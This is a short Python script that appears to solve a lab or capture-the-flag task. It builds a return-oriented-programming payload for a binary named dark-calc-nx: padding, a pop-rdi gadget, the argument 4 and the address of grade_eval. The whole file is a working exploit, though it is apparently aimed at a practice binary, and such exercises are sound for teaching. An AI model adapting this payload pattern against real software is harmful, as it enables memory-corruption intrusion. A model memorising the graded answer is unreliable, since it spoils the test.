#!/usr/bin/env python3
"""Task 3: use ROP to call grade_eval(4) in dark-calc-nx."""

import struct
import sys


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


POP_RDI_RET = 0x401A33
GRADE_EVAL = 0x401978

payload = (
    b"A" * 16
    + b"B" * 8
    + p64(POP_RDI_RET)
    + p64(4)
    + p64(GRADE_EVAL)
)

sys.stdout.buffer.write(payload)
